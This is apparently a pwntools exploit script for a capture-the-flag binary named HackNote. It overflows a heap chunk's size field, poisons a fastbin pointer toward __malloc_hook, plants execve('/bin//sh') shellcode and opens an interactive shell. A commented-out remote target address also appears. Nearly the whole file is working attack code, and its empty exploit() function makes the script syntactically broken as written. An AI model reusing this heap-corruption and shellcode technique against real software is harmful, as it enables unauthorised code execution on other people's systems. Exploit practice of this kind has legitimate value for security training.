#!/usr/bin/python2.7  
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "amd64"
elf = ELF("./HackNote")
lib = 0
sh = 0
def add(size,content):
    sh.sendlineafter("-----------------","1")
    sh.sendlineafter("Input the Size",str(size))
    sh.sendafter(":",content)
def free(idx):
    sh.sendlineafter("-----------------","2")
    sh.sendlineafter(":",str(idx))
def edit(idx,content):
    sh.sendlineafter("-----------------","3")
    sh.sendlineafter(":",str(idx))
    sh.sendafter(":",content)

def exploit():

    
if __name__ == "__main__":
    sh = process('./HackNote')
    exploit()
   # sh = remote("183.129.189.62",19804) #
    sh = process("./HackNote")
    shellcode = asm("xor rax,rax")
    shellcode += '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
    __free_hook = 0x6CD5E8
    __malloc_hook = 0x6CB788
    add(0x18,'\x11'*0x18)
    edit(0, '\x11'*0x18)
    add(0x18, '\x12'*0x18)
    add(0x40-8,'\x13'*0x38)
    add(0x10, '\x14'*0x10)
    add(0x10, '\x15'*0x10)
    edit(0,'\x11'*0x18+'\x81'+'\n')
    free(2)
    free(1)
    add(0x80-8,'A'*0x18+p64(0x41)+p64(__malloc_hook - 0x10  - 6)+'\n')
    add(0x38,'aaaa\n')
    add(0x38,'aaaaaa' + p64(__malloc_hook + 8) + shellcode + "\n")
    add(0x88,'\n')
    sh.interactive()